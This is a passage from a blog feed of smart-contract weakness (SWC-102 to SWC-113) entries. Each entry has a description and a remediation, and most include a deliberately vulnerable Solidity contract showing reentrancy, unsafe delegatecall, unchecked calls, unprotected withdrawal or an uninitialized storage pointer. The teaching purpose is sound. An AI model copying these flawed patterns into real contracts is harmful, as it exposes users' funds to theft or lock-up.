      <url>/2023/07/13/09.SWC/13.SWC-113_DoS/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-113-DoS"><a href="#SWC-113-DoS" class="headerlink" title="SWC-113_DoS"></a>SWC-113_DoS</h1><p>DoS with Failed Call</p><ul><li><strong>Description</strong>:  External calls can fail accidentally or deliberately, which can cause a DoS condition in the contract. To minimize the damage caused by such failures, it is better to isolate each external call into its own transaction that can be initiated by the recipient of the call. This is especially relevant for payments, where it is better to let users withdraw funds rather than push funds to them automatically (this also reduces the chance of problems with the gas limit).</li><li><strong>Remediation</strong>: It is recommended to follow call best practices:<ul><li>Avoid combining multiple calls in a single transaction, especially when calls are executed as part of a loop</li><li>Always assume that external calls can fail</li><li>Implement the contract logic to handle failed calls</li></ul></li></ul><p>vulnerability contract: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract Refunder &#123;</span><br><span class="line">    </span><br><span class="line">address[] private refundAddresses;</span><br><span class="line">mapping (address =&gt; uint) public refunds;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b184);</span><br><span class="line">        refundAddresses.push(0x79B483371E87d664cd39491b5F06250165e4b185);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // bad</span><br><span class="line">    function refundAll() public &#123;</span><br><span class="line">        for(uint x; x &lt; refundAddresses.length; x++) &#123; // arbitrary length iteration based on how many addresses participated</span><br><span class="line">            require(refundAddresses[x].send(refunds[refundAddresses[x]])); // doubly bad, now a single failure on send will hold up all funds</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.SWC-112_delegatecall</title>
      <link href="/2023/07/13/09.SWC/12.SWC-112_delegatecall/"/>
      <url>/2023/07/13/09.SWC/12.SWC-112_delegatecall/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-112-delegatecall"><a href="#SWC-112-delegatecall" class="headerlink" title="SWC-112_delegatecall"></a>SWC-112_delegatecall</h1><p>Delegatecall to Untrusted Callee</p><ul><li><p><strong>Description</strong>:  There exists a special variant of a message call, named <code>delegatecall</code> which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and <code>msg.sender</code> and <code>msg.value</code> do not change their values. This allows a smart contract to dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract.</p><p>Calling into untrusted contracts is very dangerous, as the code at the target address can change any storage values of the caller and has full control over the caller’s balance.</p></li><li><p><strong>Remediation</strong>: Use <code>delegatecall</code> with caution and make sure to never call into untrusted contracts. If the target address is derived from user input ensure to check it against a whitelist of trusted contracts.</p></li></ul><p>vulnerability contract 1: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract Proxy &#123;</span><br><span class="line"></span><br><span class="line">  address owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function forward(address callee, bytes _data) public &#123;</span><br><span class="line">    require(callee.delegatecall(_data));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerability contract 2: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract proxy&#123;</span><br><span class="line">  address owner;</span><br><span class="line"></span><br><span class="line">  function proxyCall(address _to, bytes _data) external &#123;</span><br><span class="line">    require( !_to.delegatecall(_data));</span><br><span class="line">  &#125;</span><br><span class="line">  function withdraw() external&#123;</span><br><span class="line">    require(msg.sender == owner);</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">You can&#x27;t use proxyCall to change the owner address as either: </span><br><span class="line"></span><br><span class="line">1) the delegatecall reverts and thus does not change owner</span><br><span class="line">2) the delegatecall does not revert and therefore will cause the proxyCall to revert and preventing owner from changing</span><br><span class="line"></span><br><span class="line">This false positive may seem like a really edge case, however since you can revert data back to proxy this patern is useful for proxy architectures</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>11.SWC-111_Use of Deprecated Solidity Functions</title>
      <link href="/2023/07/13/09.SWC/11.SWC-111_Use%20of%20Deprecated%20Solidity%20Functions/"/>
      <url>/2023/07/13/09.SWC/11.SWC-111_Use%20of%20Deprecated%20Solidity%20Functions/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-111-Use-of-Deprecated-Solidity-Functions"><a href="#SWC-111-Use-of-Deprecated-Solidity-Functions" class="headerlink" title="SWC-111_Use of Deprecated Solidity Functions"></a>SWC-111_Use of Deprecated Solidity Functions</h1><p>Use of Deprecated Solidity Functions</p><ul><li><p><strong>Description</strong>:  Several functions and operators in Solidity are deprecated. Using them leads to reduced code quality. With new major versions of the Solidity compiler, deprecated functions and operators may result in side effects and compile errors.</p></li><li><p><strong>Remediation</strong>: Solidity provides alternatives to the deprecated constructions. Most of them are aliases, thus replacing old constructions will not break current behavior. For example, <code>sha3</code> can be replaced with <code>keccak256</code>.</p></li></ul><div class="table-container"><table><thead><tr><th>Deprecated</th><th>Alternative</th></tr></thead><tbody><tr><td><code>suicide(address)</code></td><td><code>selfdestruct(address)</code></td></tr><tr><td><code>block.blockhash(uint)</code></td><td><code>blockhash(uint)</code></td></tr><tr><td><code>sha3(...)</code></td><td><code>keccak256(...)</code></td></tr><tr><td><code>callcode(...)</code></td><td><code>delegatecall(...)</code></td></tr><tr><td><code>throw</code></td><td><code>revert()</code></td></tr><tr><td><code>msg.gas</code></td><td><code>gasleft</code></td></tr><tr><td><code>constant</code></td><td><code>view</code></td></tr><tr><td><code>var</code></td><td>corresponding type name</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.SWC-110_assert</title>
      <link href="/2023/07/13/09.SWC/10.SWC-110_assert/"/>
      <url>/2023/07/13/09.SWC/10.SWC-110_assert/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-110-assert"><a href="#SWC-110-assert" class="headerlink" title="SWC-110_assert"></a>SWC-110_assert</h1><p>Assert Violation</p><ul><li><p><strong>Description</strong>:  The Solidity <code>assert()</code> function is meant to assert invariants. Properly functioning code should <em>never</em> reach a failing assert statement. A reachable assertion can mean one of two things:</p><ol><li>A bug exists in the contract that allows it to enter an invalid state;</li><li>The <code>assert</code> statement is used incorrectly, e.g. to validate inputs.</li></ol></li><li><p><strong>Remediation</strong>: Consider whether the condition checked in the <code>assert()</code> is actually an invariant. If not, replace the <code>assert()</code> statement with a <code>require()</code> statement.</p><p>If the exception is indeed caused by unexpected behaviour of the code, fix the underlying bug(s) that allow the assertion to be violated.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>09.SWC-109_Uninitialized Storage Pointer</title>
      <link href="/2023/07/13/09.SWC/09.SWC-109_Uninitialized%20Storage%20Pointer/"/>
      <url>/2023/07/13/09.SWC/09.SWC-109_Uninitialized%20Storage%20Pointer/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-109-Uninitialized-Storage-Pointer"><a href="#SWC-109-Uninitialized-Storage-Pointer" class="headerlink" title="SWC-109_Uninitialized Storage Pointer"></a>SWC-109_Uninitialized Storage Pointer</h1><p>Uninitialized Storage Pointer</p><ul><li><p><strong>Description</strong>:  Uninitialized local storage variables can point to unexpected storage locations in the contract, which can lead to intentional or unintentional vulnerabilities.</p></li><li><p><strong>Remediation</strong>: Check if the contract requires a storage object as in many situations this is actually not the case. If a local variable is sufficient, mark the storage location of the variable explicitly with the <code>memory</code> attribute. If a storage variable is needed then initialise it upon declaration and additionally specify the storage location <code>storage</code>.</p><p><strong>Note</strong>: As of compiler version 0.5.0 and higher this issue has been systematically resolved as contracts with uninitialised storage pointers do no longer compile.</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"></span><br><span class="line">// CryptoRoulette</span><br><span class="line">//</span><br><span class="line">// Guess the number secretly stored in the blockchain and win the whole contract balance!</span><br><span class="line">// A new number is randomly chosen after each try.</span><br><span class="line">//</span><br><span class="line">// To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether</span><br><span class="line"></span><br><span class="line">contract CryptoRoulette &#123;</span><br><span class="line"></span><br><span class="line">    uint256 private secretNumber;</span><br><span class="line">    uint256 public lastPlayed;</span><br><span class="line">    uint256 public betPrice = 0.1 ether;</span><br><span class="line">    address public ownerAddr;</span><br><span class="line"></span><br><span class="line">    struct Game &#123;</span><br><span class="line">        address player;</span><br><span class="line">        uint256 number;</span><br><span class="line">    &#125;</span><br><span class="line">    Game[] public gamesPlayed;</span><br><span class="line"></span><br><span class="line">    function CryptoRoulette() public &#123;</span><br><span class="line">        ownerAddr = msg.sender;</span><br><span class="line">        shuffle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function shuffle() internal &#123;</span><br><span class="line">        // randomly set secretNumber with a value between 1 and 20</span><br><span class="line">        secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function play(uint256 number) payable public &#123;</span><br><span class="line">        require(msg.value &gt;= betPrice &amp;&amp; number &lt;= 10);</span><br><span class="line"></span><br><span class="line">// fixed: Game memory game</span><br><span class="line">        Game game; // Uninitialized Storage Pointer</span><br><span class="line">        game.player = msg.sender;</span><br><span class="line">        game.number = number;</span><br><span class="line">        gamesPlayed.push(game);</span><br><span class="line"></span><br><span class="line">        if (number == secretNumber) &#123;</span><br><span class="line">            // win!</span><br><span class="line">            msg.sender.transfer(this.balance);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        shuffle();</span><br><span class="line">        lastPlayed = now;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function kill() public &#123;</span><br><span class="line">        if (msg.sender == ownerAddr &amp;&amp; now &gt; lastPlayed + 1 days) &#123;</span><br><span class="line">            suicide(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>08.SWC-108_State Variable Default Visibility</title>
      <link href="/2023/07/13/09.SWC/08.SWC-108_State%20Variable%20Default%20Visibility/"/>
      <url>/2023/07/13/09.SWC/08.SWC-108_State%20Variable%20Default%20Visibility/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-108-State-Variable-Default-Visibility"><a href="#SWC-108-State-Variable-Default-Visibility" class="headerlink" title="SWC-108_State Variable Default Visibility"></a>SWC-108_State Variable Default Visibility</h1><p>State Variable Default Visibility</p><ul><li><p><strong>Description</strong>:  Labeling the visibility explicitly makes it easier to catch incorrect assumptions about who can access the variable.</p></li><li><p><strong>Remediation</strong>: Variables can be specified as being <code>public</code>, <code>internal</code> or <code>private</code>. Explicitly define visibility for all state variables.</p></li></ul><p>vulnerability contract</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract TestStorage &#123;</span><br><span class="line"></span><br><span class="line">    uint storeduint1 = 15;</span><br><span class="line">    uint constant constuint = 16;</span><br><span class="line">    uint32 investmentsDeadlineTimeStamp = uint32(now); </span><br><span class="line"></span><br><span class="line">    bytes16 string1 = &quot;test1&quot;; </span><br><span class="line">    bytes32 private string2 = &quot;test1236&quot;; </span><br><span class="line">    string public string3 = &quot;lets string something&quot;; </span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint) public uints1; </span><br><span class="line">    mapping (address =&gt; DeviceData) structs1; </span><br><span class="line"></span><br><span class="line">    uint[] uintarray; </span><br><span class="line">    DeviceData[] deviceDataArray; </span><br><span class="line"></span><br><span class="line">    struct DeviceData &#123;</span><br><span class="line">        string deviceBrand;</span><br><span class="line">        string deviceYear;</span><br><span class="line">        string batteryWearLevel;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testStorage() public  &#123;</span><br><span class="line">        address address1 = 0xbccc714d56bc0da0fd33d96d2a87b680dd6d0df6;</span><br><span class="line">        address address2 = 0xaee905fdd3ed851e48d22059575b9f4245a82b04;</span><br><span class="line"></span><br><span class="line">        uints1[address1] = 88;</span><br><span class="line">        uints1[address2] = 99;</span><br><span class="line"></span><br><span class="line">        DeviceData memory dev1 = DeviceData(&quot;deviceBrand&quot;, &quot;deviceYear&quot;, &quot;wearLevel&quot;);</span><br><span class="line"></span><br><span class="line">        structs1[address1] = dev1;</span><br><span class="line"></span><br><span class="line">        uintarray.push(8000);</span><br><span class="line">        uintarray.push(9000);</span><br><span class="line"></span><br><span class="line">        deviceDataArray.push(dev1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.SWC-107_Reentrancy</title>
      <link href="/2023/07/13/09.SWC/07.SWC-107_Reentrancy/"/>
      <url>/2023/07/13/09.SWC/07.SWC-107_Reentrancy/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-107-Reentrancy"><a href="#SWC-107-Reentrancy" class="headerlink" title="SWC-107_Reentrancy"></a>SWC-107_Reentrancy</h1><p>State Variable Default Visibility</p><ul><li><strong>Description</strong>:  One of the major dangers of calling external contracts is that they can take over the control flow. In the reentrancy attack (a.k.a. recursive call attack), a malicious contract calls back into the calling contract before the first invocation of the function is finished. This may cause the different invocations of the function to interact in undesirable ways.</li><li><strong>Remediation</strong>: The best practices to avoid Reentrancy weaknesses are:<ul><li>Make sure all internal state changes are performed before the call is executed. This is known as the <a href="https://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern">Checks-Effects-Interactions pattern</a></li><li>Use a reentrancy lock (ie. <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol">OpenZeppelin’s ReentrancyGuard</a>.</li></ul></li></ul><p>vulnerability contract</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">contract ModifierEntrancy &#123;</span><br><span class="line"></span><br><span class="line">  mapping (address =&gt; uint) public tokenBalance;</span><br><span class="line">  string constant name = &quot;Nu Token&quot;;</span><br><span class="line">  Bank bank;</span><br><span class="line">  </span><br><span class="line">  constructor() public&#123;</span><br><span class="line">      bank = new Bank();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //If a contract has a zero balance and supports the token give them some token</span><br><span class="line">  function airDrop() hasNoBalance supportsToken  public&#123;</span><br><span class="line">    tokenBalance[msg.sender] += 20;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  //Checks that the contract responds the way we want</span><br><span class="line">  modifier supportsToken() &#123;</span><br><span class="line">  // reentrancy vulneability</span><br><span class="line">    require(keccak256(abi.encodePacked(&quot;Nu Token&quot;)) == bank.supportsToken());</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  //Checks that the caller has a zero balance</span><br><span class="line">  modifier hasNoBalance &#123;</span><br><span class="line">      require(tokenBalance[msg.sender] == 0);</span><br><span class="line">      _;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bank&#123;</span><br><span class="line"></span><br><span class="line">    function supportsToken() external returns(bytes32) &#123;</span><br><span class="line">    // reentrancy</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;No Token&quot;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.SWC-106_selfdestruct</title>
      <link href="/2023/07/13/09.SWC/06.SWC-106_selfdestruct/"/>
      <url>/2023/07/13/09.SWC/06.SWC-106_selfdestruct/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-106-selfdestruct"><a href="#SWC-106-selfdestruct" class="headerlink" title="SWC-106_selfdestruct"></a>SWC-106_selfdestruct</h1><p>Unprotected SELFDESTRUCT Instruction</p><ul><li><strong>Description</strong>:  Due to missing or insufficient access controls, malicious parties can self-destruct the contract.</li><li><strong>Remediation</strong>: Consider removing the self-destruct functionality unless it is absolutely required. If there is a valid use-case, it is recommended to implement a multisig scheme so that multiple parties must approve the self-destruct action.</li></ul>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.SWC-105_Unprotected Ether Withdrawal</title>
      <link href="/2023/07/13/09.SWC/05.SWC-105_Unprotected%20Ether%20Withdrawal/"/>
      <url>/2023/07/13/09.SWC/05.SWC-105_Unprotected%20Ether%20Withdrawal/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-105-Unprotected-Ether-Withdrawal"><a href="#SWC-105-Unprotected-Ether-Withdrawal" class="headerlink" title="SWC-105_Unprotected Ether Withdrawal"></a>SWC-105_Unprotected Ether Withdrawal</h1><p>Unprotected Ether Withdrawal</p><ul><li><p><strong>Description</strong>:  Due to missing or insufficient access controls, malicious parties can withdraw some or all Ether from the contract account.</p><p>This bug is sometimes caused by unintentionally exposing initialization functions. By wrongly naming a function intended to be a constructor, the constructor code ends up in the runtime byte code and can be called by anyone to re-initialize the contract.</p></li><li><p><strong>Remediation</strong>: Implement controls so withdrawals can only be triggered by authorized parties or according to the specs of the smart contract system.</p></li></ul><p>vulnerability contract 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line">// capturetheether ctf: https://www.levi104.com/2023/06/23/01.Capturetheether%20CTF/07.Token%20sale/</span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnerability contract …………</p>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.SWC-104_Unchecked Call Return Value</title>
      <link href="/2023/07/13/09.SWC/04.SWC-104_Unchecked%20Call%20Return%20Value/"/>
      <url>/2023/07/13/09.SWC/04.SWC-104_Unchecked%20Call%20Return%20Value/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-104-Unchecked-Call-Return-Value"><a href="#SWC-104-Unchecked-Call-Return-Value" class="headerlink" title="SWC-104_Unchecked Call Return Value"></a>SWC-104_Unchecked Call Return Value</h1><p>Unchecked Call Return Value</p><ul><li><p><strong>Description</strong>:  The return value of a message call is not checked. Execution will resume even if the called contract throws an exception. If the call fails accidentally or an attacker forces the call to fail, this may cause unexpected behaviour in the subsequent program logic.</p></li><li><p><strong>Remediation</strong>: If you choose to use low-level call methods, make sure to handle the possibility that the call will fail by checking the return value.</p></li></ul><p>vulnerable contract:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.25;</span><br><span class="line"></span><br><span class="line">contract ReturnValue &#123;</span><br><span class="line"></span><br><span class="line">  function callchecked(address callee) public &#123;</span><br><span class="line">    require(callee.call());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function callnotchecked(address callee) public &#123;</span><br><span class="line">    callee.call();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.SWC-103_Floating Pragma</title>
      <link href="/2023/07/13/09.SWC/03.SWC-103_Floating%20Pragma/"/>
      <url>/2023/07/13/09.SWC/03.SWC-103_Floating%20Pragma/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-103-Floating-Pragma"><a href="#SWC-103-Floating-Pragma" class="headerlink" title="SWC-103_Floating Pragma"></a>SWC-103_Floating Pragma</h1><p>Floating Pragma</p><ul><li><p><strong>Description</strong>:  Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.</p></li><li><p><strong>Remediation</strong>: Lock the pragma version and also consider known bugs (<a href="https://github.com/ethereum/solidity/releases">https://github.com/ethereum/solidity/releases</a>) for the compiler version that is chosen.</p><p>Pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or EthPM package. Otherwise, the developer would need to manually update the pragma in order to compile locally.</p></li></ul><p>vulnerable contract:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">// fix: pragma solidity 0.4.25;</span><br><span class="line"></span><br><span class="line">contract PragmaNotLocked &#123;</span><br><span class="line">    uint public x = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.SWC-102_Outdated Compiler Version</title>
      <link href="/2023/07/13/09.SWC/02.SWC-102_Outdated%20Compiler%20Version/"/>
      <url>/2023/07/13/09.SWC/02.SWC-102_Outdated%20Compiler%20Version/</url>
      
        <content type="html"><![CDATA[<h1 id="SWC-102-Outdated-Compiler-Version"><a href="#SWC-102-Outdated-Compiler-Version" class="headerlink" title="SWC-102_Outdated Compiler Version"></a>SWC-102_Outdated Compiler Version</h1><p>Outdated Compiler Version</p><ul><li><p><strong>Description</strong>:  Using an outdated compiler version can be problematic especially if there are publicly disclosed bugs and issues that affect the current compiler version.</p></li><li><p><strong>Remediation</strong>: It is recommended to use a recent version of the Solidity compiler.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>01.SWC-101_Integer Overflow and Underflow</title>
      <link href="/2023/07/13/09.SWC/01.SWC-101_Integer%20Overflow%20and%20Underflow/"/>
      <url>/2023/07/13/09.SWC/01.SWC-101_Integer%20Overflow%20and%20Underflow/</url>
      
